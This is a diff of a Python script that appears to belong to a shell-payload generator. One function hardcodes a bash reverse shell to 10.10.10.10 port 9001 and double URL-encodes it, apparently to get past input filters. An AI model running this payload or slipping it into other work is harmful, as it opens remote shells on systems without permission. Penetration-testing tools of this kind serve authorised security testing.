@@ -52,12 +52,11 @@ def url_encode():
   alpha = urllib.parse.quote("String I want in here(the shells that want to be URL encoded by the user.)", safe='')
   print(alpha)
 
+# This function is for double urlencoding the payloads.
 def double_url_encode():
   bravo = urllib.parse.quote("sh -i >& /dev/tcp/10.10.10.10/9001 0>&1", safe='')
   charlie = urllib.parse.quote(bravo, safe='')
   print(charlie)
-
-double_url_encode()
 
 # TODO: Work on printing the stuff from display_payload_options() function in a grid format. Ref: https://stackoverflow.com/questions/32460832/print-a-list-of-strings-in-a-grid-format-python
 # TODO: Decide on a name for the yet_to_decide() function.
